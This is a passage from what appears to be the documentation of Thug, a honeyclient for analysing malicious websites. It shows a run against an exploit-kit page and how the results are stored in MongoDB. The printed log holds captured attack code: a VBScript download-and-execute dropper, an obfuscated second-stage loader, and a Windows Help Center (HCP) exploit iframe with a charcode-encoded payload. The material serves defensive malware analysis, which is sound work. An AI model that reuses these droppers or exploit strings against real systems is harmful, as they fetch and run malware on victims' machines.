-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span>89K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>d328b5a123bce1c0d20d763ad745303a

./application/x-shockwave-flash:
total<span class="w"> </span><span class="m">4</span>.0K
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">1008</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>502da89357ca5d7c85dc7a67f8977b21

./text:
total<span class="w"> </span><span class="m">0</span>
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">144</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>html

./text/html:
total<span class="w"> </span>72K
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span>68K<span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>95ee609e6e3b69c2d9e68f34ff4a4335
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>buffer<span class="w"> </span>buffer<span class="w"> </span><span class="m">878</span><span class="w"> </span>Jul<span class="w">  </span><span class="m">2</span><span class="w"> </span><span class="m">19</span>:15<span class="w"> </span>d26b9b1a1f667004945d1d000cf4f19e
</pre></div>
</div>
<p>If the MAEC 1.1 logging mode is enabled, the file <em>analysis.xml</em> contains the URL analysis
results saved in MAEC 1.1 format (please refer to <a class="reference external" href="http://maec.mitre.org">http://maec.mitre.org</a> for additional details).
MAEC 1.1 logging is no longer supported from Thug 0.9.44 onwards.</p>
<p>Please notice that all the files downloaded during the URL analysis are saved in this directory
based on their Content-Type for convenience (if the File logging mode is enabled).</p>
<p>Moreover if MongoDB is installed the information you can see in this directory are saved in the
database instance too. Let’s take a deeper look using pymongo (you can get the same result by
using the MongoDB client <em>mongo</em>).</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~/thug/src<span class="w"> </span>$<span class="w"> </span>python
Python<span class="w"> </span><span class="m">2</span>.7.3<span class="w"> </span><span class="o">(</span>default,<span class="w"> </span>Jun<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">2012</span>,<span class="w"> </span><span class="m">10</span>:22:50<span class="o">)</span>
<span class="o">[</span>GCC<span class="w"> </span><span class="m">4</span>.5.3<span class="o">]</span><span class="w"> </span>on<span class="w"> </span>linux2
Type<span class="w"> </span><span class="s2">&quot;help&quot;</span>,<span class="w"> </span><span class="s2">&quot;copyright&quot;</span>,<span class="w"> </span><span class="s2">&quot;credits&quot;</span><span class="w"> </span>or<span class="w"> </span><span class="s2">&quot;license&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>more<span class="w"> </span>information.
&gt;&gt;&gt;<span class="w"> </span>import<span class="w"> </span>pymongo
&gt;&gt;&gt;<span class="w"> </span><span class="nv">connection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>pymongo.Connection<span class="o">()</span>
&gt;&gt;&gt;<span class="w"> </span><span class="nv">db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>connection.thug
&gt;&gt;&gt;<span class="w"> </span><span class="nv">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>db.urls.find_one<span class="o">({</span><span class="s1">&#39;url&#39;</span><span class="w"> </span>:<span class="w"> </span><span class="s1">&#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;</span><span class="o">})</span>
&gt;&gt;&gt;<span class="w"> </span>url
<span class="o">{</span>u<span class="s1">&#39;url&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;http://[omitted]/main.php?page=8c6c59becaa0da07&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;_id&#39;</span>:<span class="w"> </span>ObjectId<span class="o">(</span><span class="s1">&#39;4ff1b8efe732795951000000&#39;</span><span class="o">)}</span>
&gt;&gt;&gt;<span class="w"> </span><span class="k">for</span><span class="w"> </span>sample<span class="w"> </span><span class="k">in</span><span class="w"> </span>db.samples.find<span class="o">({</span><span class="s1">&#39;url_id&#39;</span>:<span class="w"> </span>url<span class="o">[</span><span class="s1">&#39;_id&#39;</span><span class="o">]})</span>:
...<span class="w">     </span>print<span class="w"> </span>sample
...

<span class="o">{</span>u<span class="s1">&#39;_id&#39;</span>:<span class="w"> </span>ObjectId<span class="o">(</span><span class="s1">&#39;4ff1b8f4e732795951000001&#39;</span><span class="o">)</span>,<span class="w"> </span>u<span class="s1">&#39;url&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;http://[omitted]/Ryp.jar&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;type&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;JAR&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;sha1&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;5fffd5cc4a372a6c2a826a850a955cb6a4042272&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;url_id&#39;</span>:<span class="w"> </span>ObjectId<span class="o">(</span><span class="s1">&#39;4ff1b8efe732795951000000&#39;</span><span class="o">)</span>,<span class="w"> </span>u<span class="s1">&#39;data&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;[skipped]&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;md5&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;e3639fde6ddf7fd0182fff9757143ff2&#39;</span><span class="o">}</span>
<span class="o">{</span>u<span class="s1">&#39;_id&#39;</span>:<span class="w"> </span>ObjectId<span class="o">(</span><span class="s1">&#39;4ff1b8f7e732795951000002&#39;</span><span class="o">)</span>,<span class="w"> </span>u<span class="s1">&#39;url&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;http://[omitted]/w.php?f=b081d&amp;e=2&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;type&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;PE&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;sha1&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;1445e7d338d0d7c20f1d2329f4d653cce1562cc8&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;url_id&#39;</span>:<span class="w"> </span>ObjectId<span class="o">(</span><span class="s1">&#39;4ff1b8efe732795951000000&#39;</span><span class="o">)</span>,<span class="w"> </span>u<span class="s1">&#39;data&#39;</span>:<span class="w">  </span>u<span class="s1">&#39;[skipped]&#39;</span>,<span class="w"> </span>u<span class="s1">&#39;md5&#39;</span>:<span class="w"> </span>u<span class="s1">&#39;d328b5a123bce1c0d20d763ad745303a&#39;</span><span class="o">}</span>
<span class="o">[</span>..<span class="o">]</span>
&gt;&gt;&gt;<span class="w"> </span><span class="k">for</span><span class="w"> </span>event<span class="w"> </span><span class="k">in</span><span class="w"> </span>db.events.find<span class="o">({</span><span class="s1">&#39;url_id&#39;</span>:<span class="w"> </span>url<span class="o">[</span><span class="s1">&#39;_id&#39;</span><span class="o">]})</span>:
...<span class="w">     </span>print<span class="w"> </span>event
...
<span class="o">{</span>u<span class="s1">&#39;MAEC&#39;</span>:<span class="w"> </span>u<span class="err">&#39;</span>&lt;MAEC_Bundle<span class="w"> </span>xmlns:ns1<span class="o">=</span><span class="s2">&quot;http://xml/metadataSharing.xsd&quot;</span><span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">&quot;http://maec.mitre.org/XMLSchema/maec-core-1&quot;</span><span class="w"> </span>xmlns:xsi<span class="o">=</span><span class="s2">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="w"> </span>xsi:schemaLocation<span class="o">=</span><span class="s2">&quot;http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd&quot;</span><span class="w"> </span><span class="nv">id</span><span class="o">=</span><span class="s2">&quot;maec:thug:bnd:1&quot;</span><span class="w"> </span><span class="nv">schema_version</span><span class="o">=</span><span class="s2">&quot;1.100000&quot;</span>&gt;
<span class="o">[</span>..<span class="o">]</span>
</pre></div>
</div>
</section>
<section id="browser-personality">
<h2>Browser personality<a class="headerlink" href="#browser-personality" title="Link to this heading"></a></h2>
<p>If no additional option (other than the URL) is provided the emulated browser personality is
Internet Explorer 6.0 on Windows XP platform. This choice is usually quite interesting for
the really simple reason a lot of exploit kits out there try to exploit a vulnerability in Microsoft
Data Access Components (MDAC) which allows remote code execution if facing such personality.
Thug emulates perfectly this exploit thus allowing to quite easily download a malicious
executable for later analysis.</p>
<p>If there’s the need to test the content that would be served while using a different browser
personality the <em>-u (–useragent)</em> option should be used. In the following example, the
option <em>-u winxpie80</em> is used in order to test the content served when surfing the same
page with Internet Explorer 8.0 on Windows XP platform.</p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~<span class="w"> </span>$<span class="w"> </span>thug<span class="w"> </span>-u<span class="w"> </span>winxpie80<span class="w"> </span><span class="s2">&quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:00<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>None<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:00<span class="o">]</span><span class="w"> </span>&lt;applet<span class="w"> </span><span class="nv">archive</span><span class="o">=</span><span class="s2">&quot;Ryp.jar&quot;</span><span class="w"> </span><span class="nv">code</span><span class="o">=</span><span class="s2">&quot;sIda.sIda&quot;</span>&gt;&lt;param<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;b&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;</span>&gt;&lt;/param&gt;&lt;/applet&gt;
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:00<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>Ryp.jar<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:02<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/Ryp.jar<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>applet<span class="w"> </span>Ryp.jar
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>msxml2.xmlhttp
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>acropdf.pdf
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.15
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.14
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.13
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.12
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>Unknown<span class="w"> </span>ActiveX<span class="w"> </span>Object:<span class="w"> </span>shockwaveflash.shockwaveflash.11
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span>ActiveXObject:<span class="w"> </span>shockwaveflash.shockwaveflash.10
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:03<span class="o">]</span><span class="w"> </span><span class="o">[</span>Navigator<span class="w"> </span>URL<span class="w"> </span>Translation<span class="o">]</span><span class="w"> </span>./data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span>--&gt;<span class="w">  </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Internet<span class="w"> </span>Explorer<span class="w"> </span>HCP<span class="w"> </span>Scheme<span class="w"> </span>Detected
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Help<span class="w"> </span>Center<span class="w"> </span>Malformed<span class="w"> </span>Escape<span class="w"> </span>Sequences<span class="w"> </span>Incorrect<span class="w"> </span>Handling
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span><span class="o">[</span>AST<span class="o">]</span>:<span class="w"> </span>Eval<span class="w"> </span>argument<span class="w"> </span>length<span class="w"> </span>&gt;<span class="w"> </span><span class="m">64</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="o">]</span><span class="w"> </span>Command:
cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe

<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Code:
cmd<span class="w"> </span>/c<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With<span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open<span class="w"> </span><span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set<span class="w"> </span><span class="nv">A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set<span class="w"> </span><span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span><span class="w"> </span>+<span class="w"> </span>B<span class="w"> </span>&gt;<span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>%TEMP%<span class="se">\\</span>l.vbs<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>taskkill<span class="w"> </span>/F<span class="w"> </span>/IM<span class="w"> </span>helpctr.exe
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:05<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Downloading<span class="w"> </span>from<span class="w"> </span>URL<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:06<span class="o">]</span><span class="w"> </span><span class="o">[</span>HTTP<span class="o">]</span><span class="w"> </span>URL:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Referrer:<span class="w"> </span>http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:06<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">1</span><span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>file<span class="w"> </span>d26b9b1a1f667004945d1d000cf4f19e
<span class="o">[</span><span class="m">2012</span>-07-02<span class="w"> </span><span class="m">19</span>:21:06<span class="o">]</span><span class="w"> </span><span class="o">[</span>Windows<span class="w"> </span>Script<span class="w"> </span>Host<span class="w"> </span>Run<span class="w"> </span>-<span class="w"> </span>Stage<span class="w"> </span><span class="m">2</span><span class="o">]</span><span class="w"> </span>Code:
<span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set<span class="w"> </span><span class="nv">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b<span class="w"> </span><span class="o">=</span><span class="w"> </span>f<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span>:Set<span class="w"> </span><span class="nv">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set<span class="w"> </span><span class="nv">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;am&quot;</span><span class="o">)</span>
Set<span class="w"> </span><span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
On<span class="w"> </span>Error<span class="w"> </span>resume<span class="w"> </span>next
c.open<span class="w"> </span>OT,<span class="w"> </span>a,<span class="w"> </span>z:c.send<span class="o">()</span>
If<span class="w"> </span>c.Status<span class="w"> </span><span class="o">=</span><span class="w"> </span>x<span class="w"> </span>Then
d.Open:d.Type<span class="w"> </span><span class="o">=</span><span class="w"> </span>y:d.Write<span class="w"> </span>c.ResponseBody:d.SaveToFile<span class="w"> </span>b:d.Close
End<span class="w"> </span>If
Set<span class="w"> </span><span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>,<span class="w"> </span>Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="w"> </span><span class="s2">&quot;E&quot;</span><span class="o">))</span>
W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM wm&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;player.e&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;xe&quot;</span>:W.eXeC<span class="w"> </span><span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;e&quot;</span>:Set<span class="w"> </span><span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>

<span class="s2">[2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
<span class="s2">[2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
<span class="s2">[2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
<span class="s2">[2012-07-02 19:21:11] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
<span class="s2">[2012-07-02 19:21:11] &lt;iframe height=&quot;</span><span class="m">0</span><span class="s2">&quot; src=&quot;</span>hcp://services/search?query<span class="o">=</span>anything<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">topic</span><span class="o">=</span>hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>script<span class="w"> </span>defer<span class="p">&amp;</span>gt<span class="p">;</span>eval<span class="o">(</span>Run<span class="o">(</span>String.fromCharCode<span class="o">(</span><span class="m">99</span>,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,4